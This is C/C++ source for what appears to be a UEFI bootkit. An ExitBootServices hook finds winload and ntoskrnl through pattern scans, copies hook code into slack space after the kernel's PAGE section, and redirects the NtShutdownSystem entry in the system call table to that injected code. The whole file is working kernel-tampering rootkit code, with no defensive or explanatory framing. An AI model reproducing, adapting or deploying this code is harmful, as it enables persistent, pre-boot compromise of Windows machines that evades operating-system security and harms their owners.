#include "ExitBootServices.h"

EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    SET_BACKGROUND(EFI_WHITE | EFI_BACKGROUND_RED);
    CLEAR_SCREEN();
    Log("ExitBootServices -> start");

    global::winload = memory::get_image_base(__get_rax());
    if (!global::winload)
    {
        Error("Can't find winload base!");
    }
    Log("winload -> found");

    global::BlpArchSwitchContext = memory::scan_section(global::winload, ".text", (uint8_t*)&BlpArchSwitchContextPattern, sizeof(BlpArchSwitchContextPattern));
    if (!global::BlpArchSwitchContext)
    {
        Error("Can't find BlpArchSwitchContext address!");
    }
    Log("BlpArchSwitchContext -> found");

    uint64_t OslLoaderBlockReference = memory::scan_section_ex(global::winload, ".text", (uint8_t*)&OslLoaderBlockPattern, sizeof(OslLoaderBlockPattern), (uint8_t*)&OslLoaderBlockMask);
    if (!OslLoaderBlockReference)
    {
        Error("Can't find OslLoaderBlockReference address!");
    }
    Log("OslLoaderBlockReference -> found");

    global::OslLoaderBlock = *(uint64_t*)(uint8_t*)( (OslLoaderBlockReference + 7) + *(int32_t*)(uint8_t*)(OslLoaderBlockReference + 3) );
    
    ((uint64_t(*)(uint32_t))global::BlpArchSwitchContext)( 0x0 );
    {
        global::ntoskrnl = utils::get_module_base((uint64_t)((uint8_t*)global::OslLoaderBlock + 0x10 /* ->LoadOrderListHead */), L"ntoskrnl.exe");
        if (!global::ntoskrnl)
        {
            INFINITY_LOOP();
        }

        uint64_t section_address = memory::get_section_address(global::ntoskrnl, "PAGE");
        uint32_t section_size = memory::get_section_size(global::ntoskrnl, "PAGE");

        uint64_t NtShutdownSystem = memory::get_export_address(global::ntoskrnl, "NtShutdownSystem");

        *(uint16_t*)( section_address + section_size ) = 0xDEAD;
        *(uint64_t*)( section_address + section_size + sizeof(uint16_t) ) = NtShutdownSystem;

        for (int32_t i = 0; ; i++) 
        {
            if ( *(uint8_t*)( (uint64_t)NtShutdownSystemHook + i ) == 0xCC )
            {
                break;
            }

            *(uint8_t*)( ( (section_address + section_size) + sizeof(uint16_t) + sizeof(uint64_t) ) + i ) = *(uint8_t*)( (uint64_t)NtShutdownSystemHook + i );
        }

        global::KiSystemStartup = memory::get_entry_point(global::ntoskrnl) /* KiSystemStartup */;

        for (int32_t i = 0; ; ++i)
        {
            if (*(uint32_t*)(global::KiSystemStartup + i) == 0x3C836566 /* 66 65 83 3C */)
            {
                global::KiInitializeKernel = (uint64_t)(global::KiSystemStartup + i) + *(int32_t*)(uint8_t*)((global::KiSystemStartup + i) - 4);
                break;
            }
        }

        for (int32_t i = 0; ; ++i)
        {
            if (*(uint32_t*)(global::KiInitializeKernel + i) == 0x44C93345 /* 45 33 C9 44 */)
            {
                global::KiServiceTable = (uint64_t)(uint8_t*)((global::KiInitializeKernel + i) + 17 + 7) + *(int32_t*)(uint8_t*)((global::KiInitializeKernel + i) + 17 + 3);
                break;
            }
        }

        uint64_t entry = 0;
        for (int32_t i = 0; ; ++i)
        {
            if ( *(uint32_t*)(uint8_t*)( global::KiServiceTable + (i * 4) ) == ( NtShutdownSystem - global::ntoskrnl ))
            {
                entry = global::KiServiceTable + ( i * 4 );
                break;
            }
        }

        *(uint32_t*)( entry ) = (uint32_t)( ( ( section_address + section_size ) + sizeof(uint16_t) + sizeof(uint64_t) ) - global::ntoskrnl );
    }
    ((uint64_t(*)(uint32_t))global::BlpArchSwitchContext)( 0x1 );
    
    Log("ExitBootServices -> end");
    global::BootServices->ExitBootServices = (EFI_EXIT_BOOT_SERVICES)global::ExitBootServices;
    return global::ExitBootServices(ImageHandle, MapKey);
}
